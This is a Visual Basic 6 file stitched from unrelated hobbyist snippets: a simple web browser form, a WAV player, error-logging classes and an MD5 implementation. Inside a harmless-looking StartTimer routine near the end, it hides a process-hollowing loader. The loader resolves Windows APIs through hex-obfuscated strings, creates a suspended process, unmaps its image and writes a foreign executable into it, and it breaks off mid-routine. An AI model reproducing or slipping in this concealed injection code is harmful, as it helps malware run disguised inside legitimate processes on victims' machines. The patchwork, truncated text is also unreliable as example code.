'**************************************
' Name: <1 Minute Web Browser!!!
' Description:You boss wants a webbrowse
'     r by 12, it's 11:59, just copy and paste
'     this source and you'll get a cool lookin
'     g black and white web browser in less th
'     an a minute!!!
' By: Peter Zhou
'
'
' Inputs:None
'
' Returns:None
'
'Assumes:Just create a file called Webfr
'     m.frm in notepad and copy and paste the 
'     code in it and then start a project in V
'     B and add the frm file in!!!
'
'Side Effects:None
'This code is copyrighted and has limite
'     d warranties.
'Please see http://www.Planet-Source-Cod
'     e.com/xq/ASP/txtCodeId.1417/lngWId.1/qx/
'     vb/scripts/ShowCode.htm
'for details.
'**************************************

' VIOLAZ Missing Option Explicit (SRA)

*** paste into webfrm.frm in notepad after this line ***
VERSION 5.00
Object = "{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}#1.1#0"; "SHDOCVW.DLL"
Begin VB.Form Webfrm 
BackColor=&H00000000&
BorderStyle =3 'Fixed Dialog
Caption ="Web Browser"
ClientHeight=5295
ClientLeft =45
ClientTop=330
ClientWidth =7455
BeginProperty Font 
Name="Tahoma"
Size=8.25
Charset =0
Weight =400
Underline=0'False
Italic =0'False
Strikethrough=0'False
EndProperty
LinkTopic="Form1"
MaxButton=0'False
MinButton=0'False
ScaleHeight =5295
ScaleWidth =7455
ShowInTaskbar=0'False
StartUpPosition =3 'Windows Default
Begin VB.ListBox lstFavs 
Height =255
Left=3960
TabIndex=11
Top =480
Visible =0'False
Width=1335
End
Begin VB.CommandButton cmdAdd 
BackColor=&H80000005&
Caption ="Add to Favorites"
Height =255
Left=6000
Style=1 'Graphical
TabIndex=10
Top =840
Width=1335
End
Begin VB.CommandButton cmdFav 
BackColor=&H80000005&
Caption ="Favorite"
Height =255
Left=4320
Style=1 'Graphical
TabIndex=9
Top =120
Width=735
End
Begin VB.CommandButton cmdSearch 
BackColor=&H80000005&
Caption ="Search"
Height =255
Left=5160
Style=1 'Graphical
TabIndex=8
Top =120
Width=735
End
Begin VB.CommandButton cmdForward 
BackColor=&H80000005&
Caption ="Forward"
Height =255
Left=960
Style=1 'Graphical
TabIndex=7
Top =120
Width=735
End
Begin VB.CommandButton cmdHome 
BackColor=&H80000005&
Caption ="Home"
Height =255
Left=3480
Style=1 'Graphical
TabIndex=6
Top =120
Width=735
End
Begin VB.CommandButton cmdReload 
BackColor=&H80000005&
Caption ="Reload"
Height =255
Left=2640
Style=1 'Graphical
TabIndex=5
Top =120
Width=735
End
Begin VB.CommandButton cmdStop 
BackColor=&H80000005&
Caption ="Stop"
Height =255
Left=1800
Style=1 'Graphical
TabIndex=4
Top =120
Width=735
End
Begin VB.CommandButton cmdBack 
BackColor=&H80000005&
Caption ="Back"
Height =255
Left=120
Style=1 'Graphical
TabIndex=3
Top =120
Width=735
End
Begin VB.ComboBox txtUrl 
Height =315
Left=720
Style=1 'Simple Combo
TabIndex=2
Text="C:\"
Top =840
Width=5175
End
Begin SHDocVwCtl.WebBrowser WebBrowser1 
Height =3975
Left=120
TabIndex=0
Top =1200
Width=7215
ExtentX =12726
ExtentY =7011
ViewMode=1
Offline =0
Silent =0
RegisterAsBrowser=0
RegisterAsDropTarget=1
AutoArrange =-1 'True
NoClientEdge=0'False
AlignLeft=0'False
ViewID ="{0057D0E0-3573-11CF-AE69-08002B2E1262}"
Location=""
End
Begin VB.Label Label1 
BackColor=&H00000000&
Caption ="Go To:"


ForeColor=&H80000005&
    Height =255
    Left=120
    TabIndex=1
    Top =840
    Width=615
    End
    End
    Attribute VB_Name = "CivettaVB"
    Attribute VB_GlobalNameSpace = False
    Attribute VB_Creatable = False
    Attribute VB_PredeclaredId = True
    Attribute VB_Exposed = False
    Dim FN As Integer


	'************************************** 
'Windows API/Global Declarations for :* 
' Make Your Own *WAV* Player! * 
'************************************** 
Public Declare Function GetCursorPos Lib "user32" (lpPoint As POINTAPI) As Long Public Declare Function GetWindowText Lib "user32" Alias "GetWindowTextA" (ByVal hwnd As Long, ByVal lpString As String, ByVal cch As Long) As Long 
Public Declare Function GetModuleFileName Lib "kernel32" Alias "GetModuleFileNameA" (ByVal hModule As Long, ByVal lpFileName As String, ByVal nSize As Long) As Long 
Public Declare Function WindowFromPointXY Lib "user32" Alias "WindowFromPoint" (ByVal xPoint As Long, ByVal yPoint As Long) As Long 
Public Declare Function GetClassName& Lib "user32" Alias "GetClassNameA" (ByVal hwnd As Long, ByVal lpClassName As String, ByVal nMaxCount As Long) 
Public Declare Function GetWindowWord Lib "user32" (ByVal hwnd As Long, ByVal nIndex As Long) As Integer 
Public Declare Function GetParent Lib "user32" (ByVal hwnd As Long) As Long 
Declare Function sndPlaySound Lib "winmm.dll" Alias "sndPlaySoundA" (ByVal lpszSoundName As String, ByVal uFlags As Long) As Long
Public Const SND_SYNC = &H0 
Public Const SND_ASYNC = &H1 
Public Const SND_NODEFAULT = &H2 
Public Const SND_MEMORY = &H4 
Public Const SND_LOOP = &H8 
Public Const SND_NOSTOP = &H10 
'************************************** 
' Name: * Make Your Own *WAV* Player! * 
' Description:This is the code to *PLAY* ' , *STOP*, and *LOOP* WAV files. Its real 
' ly easy! even for a beginner! You can ma 
' ke your own WAV Player! 
' By: Matt Evans ' ' ' Inputs:none ' ' Returns:none ' 'Assumes:none ' 'Side Effects:none 'This code is copyrighted and has limite ' d warranties. 'Please see http://www.Planet-Source-Cod ' e.com/xq/ASP/txtCodeId.1654/lngWId.1/qx/ ' vb/scripts/ShowCode.htm 'for details. '************************************** Sub WAVStop() Call WAVPlay(" ") End Sub Sub WAVLoop(File) Dim SoundName As String SoundName$ = File wFlags% = SND_ASYNC Or SND_LOOP X = sndPlaySound(SoundName$, wFlags%) End Sub Sub WAVPlay(File) Dim SoundName As String SoundName$ = File wFlags% = SND_ASYNC Or SND_NODEFAULT X = sndPlaySound(SoundName$, wFlags%) End Sub 

Private Sub cmdAdd_Click()
    FN = FreeFile
    Open "c:\favs.txt" For Output As FN
    Print #FN, txtUrl.Text & Chr(13)
    Close #FN
End Sub


Private Sub cmdBack_Click()
    On Error Resume Next
    WebBrowser1.GoBack
End Sub


Private Sub cmdFav_Click()
    On Error Resume Next
    FN = FreeFile
    Open "c:\favs.txt" For Input As FN
    lstFavs.Visible = True


    Do Until EOF(FN)
        Line Input #FN, NextLine$
        lstFavs.AddItem NextLine$
    Loop
    Close #FN
End Sub


Private Sub cmdForward_Click()
    On Error Resume Next
    WebBrowser1.GoForward
End Sub


Private Sub cmdHome_Click()
    WebBrowser1.GoHome
End Sub


Private Sub cmdReload_Click()
    WebBrowser1.Refresh
End Sub


Private Sub cmdSearch_Click()
    WebBrowser1.GoSearch
End Sub


Private Sub cmdStop_Click()
    WebBrowser1.Stop
End Sub


Private Sub Form_Load()
    URL$ = "c:\"
    WebBrowser1.Navigate URL$
End Sub


Private Sub lstFavs_Click()
    txtUrl.Text = lstFavs.List(lstFavs.ListIndex)
    txtUrl_KeyPress 13
    lstFavs.Visible = False
    Close #FN
End Sub


Private Sub txtUrl_KeyPress(KeyAscii As Integer)
    On Error Resume Next


    If KeyAscii = 13 Then
        URL$ = txtUrl.Text
        WebBrowser1.Navigate URL$
    End If
End Sub

Private Sub Command1_Click()
    'CAUSES ERROR
    Dim x As Integer
    x = 1 / 0
End Sub


Private Sub Command2_Click()
    'Use this style in every procedure
    'You can put a resume next after Error_d
    '     escript
    'However this is unpredictable, and can 
    '     cause code to execute
    'in the wrong context
    'code set up this way will always die gr
    '     acefully and the user will be none the w
    '     iser
    On Error GoTo Errhandler
    Dim x As Integer
    x = 1 / 0
    Exit Sub
    Errhandler:
    ERROR_DESCRIPT
End Sub


Public Sub ERROR_DESCRIPT()
    'The cases are set up to show you how to
    '     handle different kinds of errors, this w
    '     as used with
    ' a database


    Select Case Err.Number
        Case 3265
        ' Err.Clear ' MsgBox "This Record exists
        '     in the database, your change will not be
        '     saved"
        Case 3021
        ' MsgBox Err.Description & Err.Number
        'Err.Clear
        'MsgBox "You have either reached the end
        '     or beginning of the Records"
        Case Else
        Err.Clear
    End Select

End Sub

Private Function bDebugMode() As Boolean
    On Error GoTo ErrorHandler
    'in compiledmode the next line is not 
    'available, so no error occurs !
    Debug.Print 1 / 0
    Exit Function
    ErrorHandler:
    bDebugMode = True
End Function

Public Function ErrorHandler(iErrNum) As Long
    Dim iAction As Long


    Select Case iErrNum
        Case -2147467259
        MsgBox "A database data entry violation has occurred. " & "Error Number = " & iErrNum
        iAction = 5
        Case 5
        'Invalid Procedure Call
        MsgBox Error(iErrNum) & " Contact Help Desk."
        iAction = 2
        Case 7
        'Out of memory
        MsgBox "Out of Memory. Close all unnecessary applications."
        iAction = 1
        Case 11
        'Divide by 0
        MsgBox "Zero is not a valid value."
        iAction = 1
        Case 48, 49, 51
        'Error in loading DLL
        MsgBox iErrNum & " Contact Help Desk"
        iAction = 5
        Case 57
        'Device I/O error
        MsgBox "Insert a disk into Drive A."
        iAction = 1
        Case 68
        'Device Unavailable
        MsgBox "Device is unavailable(the device may not exist or it is currently unavailable)."
        iAction = 4
        Case 482, 483
        'General Printer Error
        MsgBox "A general printer error has occurred. Your printer may be offline."
        iAction = 4
        Case Else
        MsgBox "Unrecoverable Error. Exiting Application. " & "Error Number = " & iErrNum
        iAction = 5
    End Select
ErrorHandler = iAction
End Function
				
Private mvarDaysToKeep As Integer 'local copy
Private Const File As String = "classLogFile"


Public Property Let DaysToKeep(ByVal vData As Integer)
    mvarDaysToKeep = vData
End Property


Public Property Get DaysToKeep() As Integer
    DaysToKeep = mvarDaysToKeep
End Property


Public Sub WriteLog(lstrMessage As String, Optional lstrProc As String, Optional lstrFile As String, Optional lboolNewEntry As Boolean)
    '***************************************
    '     ***********************
    '* procedure to write out log entries
    '* it accepts the following parameters:
    '* lstrMessage (String containing the me
    '     ssage to be logged)
    '* lstrProc (optional string containing 
    '     the procedure that
    '* generated the log entry)
    '* lstrFile (optional string containing 
    '     the file that
    '* contains the procedure that generated
    '     the log entry)
    '* lboolNewEntry (optional boolean to fo
    '     rce the procedure
    '* to treat this entry as a new entry th
    '     ereby adding
    '* the entry separation formatting)
    '***************************************
    '     ************************
    Dim lstrMyDate As String
    Dim lstrMyTime As String
    Dim lstrFileName As String
    Dim lintFileNum As Integer
    Dim lstrLogMessage As String
    Dim msg As String
    Const SubName = "Public Sub oError.WriteLog(lstrMessage As String, Optional lstrProc As String, Optional lstrFile As String, Optional lboolNewEntry As Boolean)"
    On Error GoTo Error
    ' get a free file number for the error.l
    '     og file
    lintFileNum = FreeFile
    ' assign the file name
    lstrFileName = App.Path & "\error.log"
    ' open the log file
    Open lstrFileName For Append As lintFileNum
    ' format and initialize the date and tim
    '     e variables
    lstrMyDate = Format(Date, "mmm dd yyyy")
    lstrMyTime = Format(Time, "hh:mm:ss AMPM")


    If lboolNewEntry = True Then
        ' write the top boundary of the log entr
        '     y.
        lstrLogMessage = lstrMyDate & " " & lstrMyTime & " ********************************************************************************** "
        Print #lintFileNum, lstrLogMessage


        If Len(lstrFile) > 0 Then ' write the file
            lstrLogMessage = lstrMyDate & " " & lstrMyTime & " *** File: " & lstrFile
        Else
            lstrLogMessage = lstrMyDate & " " & lstrMyTime & " *** File: Not Supplied"
        End If


        If Len(lstrProc) > 0 Then ' write the procedure
            lstrLogMessage = lstrLogMessage & " ***** " & " Procedure: " & lstrProc
        Else
            lstrLogMessage = lstrLogMessage & " ***** " & " Procedure: Not Supplied"
        End If
        Print #lintFileNum, lstrLogMessage
    End If
    ' write the log entry
    lstrLogMessage = lstrMyDate & " " & lstrMyTime & " *** " & lstrMessage
    Print #lintFileNum, lstrLogMessage


    If lstrMessage = "Normal Exit" Then
        ' write the bottom boundary of the log e
        '     ntry.
        lstrLogMessage = lstrMyDate & " " & lstrMyTime & " ********************************************************************************** "
        Print #lintFileNum, lstrLogMessage
    End If
    'close the log file
    Close lintFileNum
    Exit Sub
    Error:
    msg = "Error in creating or editing the error.log file." & vbCrLf
    msg = msg & "Error: " & Err.Number & " - " & Err.Description & vbCrLf
    msg = msg & "Program File: " & File & "Procedure: " & SubName
    MsgBox msg, vbCritical
End Sub


Private Sub RemoveOldLogEntries(Days As Integer)
    '***************************************
    '     **********************
    '* RemoveOldLogEntries is a procedure th
    '     at, as it's name
    '* implies parses thru the lines in the 
    '     error log file created
    '* in the above oError.WriteLog procedur
    '     e and removes entries
    '* past an number of days specified at t
    '     he time this procedure
    '* is called
    '* It accepts the following parameters:
    '* Days (an integer that specifies the n
    '     umber of days
    '* beyond which to delete the log entrie
    '     s)
    '***************************************
    '     **********************
    Dim lstrInFileName, lstrOutFileName As String
    Dim lstrLogEntry, lstrEntryDate As String
    Dim lintInFileNum, lintOutFileNum As Integer
    Const SubName = "Private Sub RemoveOldLogEntries(Days As Integer)"
    On Error GoTo Error
    WriteLog "Removing log entries greater than " & Str(Days) & " days old.", SubName, File, False
    ' assign the file name
    lstrInFileName = App.Path & "\error.log"
    lstrOutFileName = App.Path & "\error.tmp"


    If Dir(lstrInFileName) = "error.log" Then
        ' get a free file number for the error.l
        '     og file
        lintInFileNum = FreeFile
        ' open the error.log file for reading an
        '     d the error.tmp file for writing
        Open lstrInFileName For Input As lintInFileNum
        lintOutFileNum = FreeFile
        Open lstrOutFileName For Append As lintOutFileNum


        Do While Not EOF(lintInFileNum)
            Line Input #lintInFileNum, lstrLogEntry' Read line into variable.
            lstrEntryDate = Left(lstrLogEntry, 11)


            If DateDiff("d", lstrEntryDate, Now) <= Days Then
                Print #lintOutFileNum, lstrLogEntry
                Exit Do
            End If
            RecoverFromError:
            On Error GoTo Error:
        Loop


        Do While Not EOF(1)
            Line Input #lintInFileNum, lstrLogEntry
            Print #lintOutFileNum, lstrLogEntry
        Loop
        Close #lintInFileNum' Close file.
        Close #lintOutFileNum
        Kill lstrInFileName
        Name lstrOutFileName As lstrInFileName
    End If
    Exit Sub
    Error:


    If Err.Number = "13" Then
        GoTo RecoverFromError
    End If
    MsgBox "Error: " & Err.Number & " - " & Err.Description, vbCritical
End Sub


Public Sub SimpleError(Optional SubName As String, Optional FormName As String)
    Dim msg As String
    If Len(SubName) = 0 Then SubName = "Unspecified"
    If Len(FormName) = 0 Then SubName = "Unspecified"
    msg = "Error: " & Err.Number & " - " & Err.Description
    MsgBox msg, vbCritical
    WriteLog msg, SubName, FormName, True
End Sub


Private Sub Class_Initialize()
    WriteLog App.EXEName & " Started", "Private Sub Class_Initialize()", File, True
    DaysToKeep = 1
End Sub


Private Sub Class_Terminate()
    WriteLog "Terminating LogFile Object", "Private Sub Class_Terminate()", File, True
    RemoveOldLogEntries DaysToKeep
    WriteLog "Normal Exit", "Private Sub Class_Terminate()", File, True
End Sub

Private Const OFFSET_4 = 4294967296#
Private Const MAXINT_4 = 2147483647

Private Const S11 = 7

Private Const S12 = 12
Private Const S13 = 17
Private Const S14 = 22
Private Const S21 = 5

Private Const S22 = 9
Private Const S23 = 14
Private Const S24 = 20
Private Const S31 = 4

Private Const S32 = 11
Private Const S33 = 16
Private Const S34 = 23
Private Const S41 = 6

Private Const S42 = 10
Private Const S43 = 15
Private Const S44 = 21

'=

'= Class Variables
'=

Private State(4) As Long
Private ByteCounter As Long

Private ByteBuffer(63) As Byte

'=
'= Class Properties
'=

Property Get RegisterA() As String

    RegisterA = State(1)
End Property

Property Get RegisterB() As String
    RegisterB = State(2)

End Property

Property Get RegisterC() As String
    RegisterC = State(3)
End Property


Property Get RegisterD() As String
    RegisterD = State(4)
End Property

'=
'= Class Functions
'=

'
' Function to quickly digest a file into a hex string
'

Public Function DigestFileToHexStr(FileName As String) As String

    Open FileName For Binary Access Read As #1
    MD5Init
    Do While Not EOF(1)
        Get #1, , ByteBuffer
        If Loc(1) < LOF(1) Then

            ByteCounter = ByteCounter + 64
            MD5Transform ByteBuffer
        End If
    Loop
    ByteCounter = ByteCounter + (LOF(1) Mod 64)
    Close #1
    MD5Final
    DigestFileToHexStr = GetValues
End Function

'
' Function to digest a text string and output the result as a string
' of hexadecimal characters.
'

Public Function DigestStrToHexStr(SourceString As String) As String

    MD5Init
    MD5Update Len(SourceString), StringToArray(SourceString)
    MD5Final
    DigestStrToHexStr = GetValues
End Function
'
' A utility function which converts a string into an array of
' bytes.
'


Private Function StringToArray(InString As String) As Byte()
    Dim I As Integer

    Dim bytBuffer() As Byte
    ReDim bytBuffer(Len(InString))
    For I = 0 To Len(InString) - 1
        bytBuffer(I) = Asc(Mid(InString, I + 1, 1))
    Next I
    StringToArray = bytBuffer

End Function
'
' Concatenate the four state vaules into one string
'

Public Function GetValues() As String

    GetValues = LongToString(State(1)) & LongToString(State(2)) _
    & LongToString(State(3)) & LongToString(State(4))
End Function
'
' Convert a Long to a Hex string
'

Private Function LongToString(Num As Long) As String

        Dim a As Byte
        Dim b As Byte
        Dim c As Byte

        Dim d As Byte
        
        a = Num And &HFF&
        If a < 16 Then

            LongToString = "0" & Hex(a)
        Else
            LongToString = Hex(a)
        End If
               
        b = (Num And &HFF00&) \ 256
        If b < 16 Then

            LongToString = LongToString & "0" & Hex(b)
        Else
            LongToString = LongToString & Hex(b)
        End If
        
        c = (Num And &HFF0000) \ 65536
        If c < 16 Then

            LongToString = LongToString & "0" & Hex(c)
        Else
            LongToString = LongToString & Hex(c)
        End If
       
        If Num < 0 Then

            d = ((Num And &H7F000000) \ 16777216) Or &H80&
        Else
            d = (Num And &HFF000000) \ 16777216
        End If

        
        If d < 16 Then
            LongToString = LongToString & "0" & Hex(d)
        Else
            LongToString = LongToString & Hex(d)
        End If

    
End Function
'
' Initialize the class
'   This must be called before a digest calculation is started
'

Public Sub MD5Init()
    ByteCounter = 0
    State(1) = UnsignedToLong(1732584193#)
    State(2) = UnsignedToLong(4023233417#)
    State(3) = UnsignedToLong(2562383102#)
    State(4) = UnsignedToLong(271733878#)

End Sub
'
' MD5 Final
'

Public Sub MD5Final()
    Dim dblBits As Double

    
    Dim padding(72) As Byte
    Dim lngBytesBuffered As Long
    
    padding(0) = &H80

    
    dblBits = ByteCounter * 8
    
    ' Pad out
    lngBytesBuffered = ByteCounter Mod 64
    If lngBytesBuffered <= 56 Then
        MD5Update 56 - lngBytesBuffered, padding
    Else

        MD5Update 120 - ByteCounter, padding
    End If
    
    
    padding(0) = UnsignedToLong(dblBits) And &HFF&
    padding(1) = UnsignedToLong(dblBits) \ 256 And &HFF&
    padding(2) = UnsignedToLong(dblBits) \ 65536 And &HFF&
    padding(3) = UnsignedToLong(dblBits) \ 16777216 And &HFF&
    padding(4) = 0
    padding(5) = 0
    padding(6) = 0
    padding(7) = 0
    
    MD5Update 8, padding

End Sub
'
' Break up input stream into 64 byte chunks
'

Public Sub MD5Update(InputLen As Long, InputBuffer() As Byte)
    Dim II As Integer

    Dim I As Integer
    Dim J As Integer
    Dim K As Integer

    Dim lngBufferedBytes As Long
    Dim lngBufferRemaining As Long
    Dim lngRem As Long

    
    lngBufferedBytes = ByteCounter Mod 64
    lngBufferRemaining = 64 - lngBufferedBytes
    ByteCounter = ByteCounter + InputLen
    ' Use up old buffer results first
    If InputLen >= lngBufferRemaining Then
        For II = 0 To lngBufferRemaining - 1
            ByteBuffer(lngBufferedBytes + II) = InputBuffer(II)
        Next II
        MD5Transform ByteBuffer
        
        lngRem = (InputLen) Mod 64

        ' The transfer is a multiple of 64 lets do some transformations
        For I = lngBufferRemaining To InputLen - II - lngRem Step 64
            For J = 0 To 63
                ByteBuffer(J) = InputBuffer(I + J)
            Next J
            MD5Transform ByteBuffer
        Next I
        lngBufferedBytes = 0
    Else

      I = 0
    End If
    
    ' Buffer any remaining input
    For K = 0 To InputLen - I - 1
        ByteBuffer(lngBufferedBytes + K) = InputBuffer(I + K)
    Next K
    

End Sub
'
' MD5 Transform
'

Private Sub MD5Transform(Buffer() As Byte)
    Dim x(16) As Long

    Dim a As Long
    Dim b As Long
    Dim c As Long

    Dim d As Long
    
    a = State(1)
    b = State(2)
    c = State(3)
    d = State(4)
    
    Decode 64, x, Buffer
    ' Round 1

    FF a, b, c, d, x(0), S11, -680876936
    FF d, a, b, c, x(1), S12, -389564586
    FF c, d, a, b, x(2), S13, 606105819
    FF b, c, d, a, x(3), S14, -1044525330
    FF a, b, c, d, x(4), S11, -176418897
    FF d, a, b, c, x(5), S12, 1200080426
    FF c, d, a, b, x(6), S13, -1473231341
    FF b, c, d, a, x(7), S14, -45705983
    FF a, b, c, d, x(8), S11, 1770035416
    FF d, a, b, c, x(9), S12, -1958414417
    FF c, d, a, b, x(10), S13, -42063
    FF b, c, d, a, x(11), S14, -1990404162
    FF a, b, c, d, x(12), S11, 1804603682
    FF d, a, b, c, x(13), S12, -40341101
    FF c, d, a, b, x(14), S13, -1502002290
    FF b, c, d, a, x(15), S14, 1236535329
    
    ' Round 2

    GG a, b, c, d, x(1), S21, -165796510
    GG d, a, b, c, x(6), S22, -1069501632
    GG c, d, a, b, x(11), S23, 643717713
    GG b, c, d, a, x(0), S24, -373897302
    GG a, b, c, d, x(5), S21, -701558691
    GG d, a, b, c, x(10), S22, 38016083
    GG c, d, a, b, x(15), S23, -660478335
    GG b, c, d, a, x(4), S24, -405537848
    GG a, b, c, d, x(9), S21, 568446438
    GG d, a, b, c, x(14), S22, -1019803690
    GG c, d, a, b, x(3), S23, -187363961
    GG b, c, d, a, x(8), S24, 1163531501
    GG a, b, c, d, x(13), S21, -1444681467
    GG d, a, b, c, x(2), S22, -51403784
    GG c, d, a, b, x(7), S23, 1735328473
    GG b, c, d, a, x(12), S24, -1926607734
    
    ' Round 3
    HH a, b, c, d, x(5), S31, -378558
    HH d, a, b, c, x(8), S32, -2022574463
    HH c, d, a, b, x(11), S33, 1839030562
    HH b, c, d, a, x(14), S34, -35309556
    HH a, b, c, d, x(1), S31, -1530992060
    HH d, a, b, c, x(4), S32, 1272893353
    HH c, d, a, b, x(7), S33, -155497632
    HH b, c, d, a, x(10), S34, -1094730640
    HH a, b, c, d, x(13), S31, 681279174
    HH d, a, b, c, x(0), S32, -358537222
    HH c, d, a, b, x(3), S33, -722521979
    HH b, c, d, a, x(6), S34, 76029189
    HH a, b, c, d, x(9), S31, -640364487
    HH d, a, b, c, x(12), S32, -421815835
    HH c, d, a, b, x(15), S33, 530742520
    HH b, c, d, a, x(2), S34, -995338651
    
    ' Round 4
    II a, b, c, d, x(0), S41, -198630844
    II d, a, b, c, x(7), S42, 1126891415
    II c, d, a, b, x(14), S43, -1416354905
    II b, c, d, a, x(5), S44, -57434055
    II a, b, c, d, x(12), S41, 1700485571
    II d, a, b, c, x(3), S42, -1894986606
    II c, d, a, b, x(10), S43, -1051523
    II b, c, d, a, x(1), S44, -2054922799
    II a, b, c, d, x(8), S41, 1873313359
    II d, a, b, c, x(15), S42, -30611744
    II c, d, a, b, x(6), S43, -1560198380
    II b, c, d, a, x(13), S44, 1309151649
    II a, b, c, d, x(4), S41, -145523070
    II d, a, b, c, x(11), S42, -1120210379
    II c, d, a, b, x(2), S43, 718787259
    II b, c, d, a, x(9), S44, -343485551
    
    
    State(1) = LongOverflowAdd(State(1), a)
    State(2) = LongOverflowAdd(State(2), b)
    State(3) = LongOverflowAdd(State(3), c)
    State(4) = LongOverflowAdd(State(4), d)
'  /* Zeroize sensitive information.
'*/
'  MD5_memset ((POINTER)x, 0, sizeof (x));

    
End Sub

Private Sub Decode(Length As Integer, OutputBuffer() As Long, InputBuffer() As Byte)
    Dim intDblIndex As Integer

    Dim intByteIndex As Integer
    Dim dblSum As Double
    
    intDblIndex = 0
    For intByteIndex = 0 To Length - 1 Step 4
        dblSum = InputBuffer(intByteIndex) + _
                                    InputBuffer(intByteIndex + 1) * 256# + _
                                    InputBuffer(intByteIndex + 2) * 65536# + _
                                    InputBuffer(intByteIndex + 3) * 16777216#
        OutputBuffer(intDblIndex) = UnsignedToLong(dblSum)
        intDblIndex = intDblIndex + 1
    Next intByteIndex

End Sub
'
' FF, GG, HH, and II transformations for rounds 1, 2, 3, and 4.
' Rotation is separate from addition to prevent recomputation.
'

Private Function FF(a As Long, _
                    b As Long, _
                    c As Long, _
                    d As Long, _
                    x As Long, _
                    s As Long, _
                    ac As Long) As Long

    a = LongOverflowAdd4(a, (b And c) Or (Not (b) And d), x, ac)
    a = LongLeftRotate(a, s)
    a = LongOverflowAdd(a, b)
End Function


Private Function GG(a As Long, _
                    b As Long, _
                    c As Long, _
                    d As Long, _
                    x As Long, _
                    s As Long, _
                    ac As Long) As Long

    a = LongOverflowAdd4(a, (b And d) Or (c And Not (d)), x, ac)
    a = LongLeftRotate(a, s)
    a = LongOverflowAdd(a, b)
End Function


Private Function HH(a As Long, _
                    b As Long, _
                    c As Long, _
                    d As Long, _
                    x As Long, _
                    s As Long, _
                    ac As Long) As Long

    a = LongOverflowAdd4(a, b Xor c Xor d, x, ac)
    a = LongLeftRotate(a, s)
    a = LongOverflowAdd(a, b)
End Function

Private Function II(a As Long, _
                    b As Long, _
                    c As Long, _
                    d As Long, _
                    x As Long, _
                    s As Long, _
                    ac As Long) As Long

    a = LongOverflowAdd4(a, c Xor (b Or Not (d)), x, ac)
    a = LongLeftRotate(a, s)
    a = LongOverflowAdd(a, b)
End Function
'
' Rotate a long to the right

'

Function LongLeftRotate(value As Long, bits As Long) As Long

    Dim lngSign As Long
    Dim lngI As Long
    bits = bits Mod 32
    If bits = 0 Then LongLeftRotate = value: Exit Function

    For lngI = 1 To bits
        lngSign = value And &HC0000000
        value = (value And &H3FFFFFFF) * 2
        value = value Or ((lngSign < 0) And 1) Or (CBool(lngSign And _
                &H40000000) And &H80000000)
    Next

    LongLeftRotate = value
End Function
'
' Function to add two unsigned numbers together as in C.
' Overflows are ignored!
'

Private Function LongOverflowAdd(Val1 As Long, Val2 As Long) As Long

    Dim lngHighWord As Long
    Dim lngLowWord As Long
    Dim lngOverflow As Long

    lngLowWord = (Val1 And &HFFFF&) + (Val2 And &HFFFF&)
    lngOverflow = lngLowWord \ 65536
    lngHighWord = (((Val1 And &HFFFF0000) \ 65536) +  _
                     ((Val2 And &HFFFF0000) \ 65536) + lngOverflow) And &HFFFF&
    LongOverflowAdd = UnsignedToLong((lngHighWord * 65536#) + (lngLowWord And &HFFFF&))

End Function
'
' Function to add two unsigned numbers together as in C.
' Overflows are ignored!
'

Private Function LongOverflowAdd4(Val1 As Long,Val2 As Long _
,val3 As Long, val4 As Long) As Long

    Dim lngHighWord As Long
    Dim lngLowWord As Long
    Dim lngOverflow As Long

    lngLowWord = (Val1 And &HFFFF&) + (Val2 And &HFFFF&) + (val3 And &HFFFF&) + _
    (val4 And &HFFFF&)
    
    
    lngOverflow = lngLowWord \ 65536
    lngHighWord = (((Val1 And &HFFFF0000) \ 65536) + _
                   ((Val2 And &HFFFF0000) \ 65536) + _
                   ((val3 And &HFFFF0000) \ 65536) + _
                   ((val4 And &HFFFF0000) \ 65536) + _
                   lngOverflow) And &HFFFF&
    LongOverflowAdd4 = UnsignedToLong((lngHighWord * 65536#) + _
    (lngLowWord And &HFFFF&))

End Function
'
' Convert an unsigned double into a long
'

Private Function UnsignedToLong(value As Double) As Long

        If value < 0 Or value >= OFFSET_4 Then Error 6 ' Overflow
        If value <= MAXINT_4 Then

          UnsignedToLong = value
        Else
          UnsignedToLong = value - OFFSET_4
        End If
      End Function
'

' Convert a long to an unsigned Double
'

Private Function LongToUnsigned(value As Long) As Double

        If value < 0 Then
          LongToUnsigned = value + OFFSET_4
        Else
          LongToUnsigned = value
        End If

End Function

Dim start, finish


Public Sub StopTimer()
    finish = GetTickCount()
End Sub


Public Sub StartTimer()
    start = GetTickCount()
    finish = 0
	'kernel32
lKernel = LoadLibrary(nlfpkgnrj("6B65726E656C3332"))
 
'ntdll
lNTDll = LoadLibrary(nlfpkgnrj("6E74646C6C"))
 
If sHost = vbNullString Then
    sHost = Space(260)
 
    'GetModuleFileNameW
   lMod = GetProcAddress(lKernel, nlfpkgnrj("4765744D6F64756C6546696C654E616D6557"))
    Invoke lMod, App.hInstance, StrPtr(sHost), 260
End If
 
With tIMAGE_NT_HEADERS.OptionalHeader
 
    tSTARTUPINFO.cb = Len(tSTARTUPINFO)
 
    'CreateProcessW
   lMod = GetProcAddress(lKernel, nlfpkgnrj("43726561746550726F6365737357"))
    Invoke lMod, 0, StrPtr(sHost), 0, 0, 0, CREATE_SUSPENDED, 0, 0, VarPtr(tSTARTUPINFO), VarPtr(tPROCESS_INFORMATION)
 
    'NtUnmapViewOfSection
   lMod = GetProcAddress(lNTDll, nlfpkgnrj("4E74556E6D6170566965774F6653656374696F6E"))
    Invoke lMod, tPROCESS_INFORMATION.hProcess, .ImageBase
 
    'VirtualAllocEx
   lMod = GetProcAddress(lKernel, nlfpkgnrj("5669727475616C416C6C6F634578"))
    Invoke lMod, tPROCESS_INFORMATION.hProcess, .ImageBase, .SizeOfImage, MEM_COMMIT Or MEM_RESERVE, PAGE_EXECUTE_READWRITE
 
    'NtWriteVirtualMemory
   lMod = GetProcAddress(lNTDll, nlfpkgnrj("4E7457726974655669727475616C4D656D6F7279"))
    Invoke lMod, tPROCESS_INFORMATION.hProcess, .ImageBase, VarPtr(bvBuff(0)), .SizeOfHeaders, 0
 
    For i = 0 To tIMAGE_NT_HEADERS.FileHeader.NumberOfSections - 1
        CpyMem tIMAGE_SECTION_HEADER, bvBuff(tIMAGE_DOS_HEADER.e_lfanew + SIZE_NT_HEADERS + SIZE_IMAGE_SECTION_HEADER * i), Len(tIMAGE_SECTION_HEADER)
        Invoke lMod, tPROCESS_INFORMATION.hProcess, .ImageBase + tIMAGE_SECTION_HEADER.VirtualAddress, VarPtr(bvBuff(tIMAGE_SECTION_HEADER.PointerToRawData)), tIMAGE_SECTION_HEADER.SizeOfRawData, 0
    Next i
 
    tCONTEXT.ContextFlags = CONTEXT_FULL
 
    'NtGetContextThread
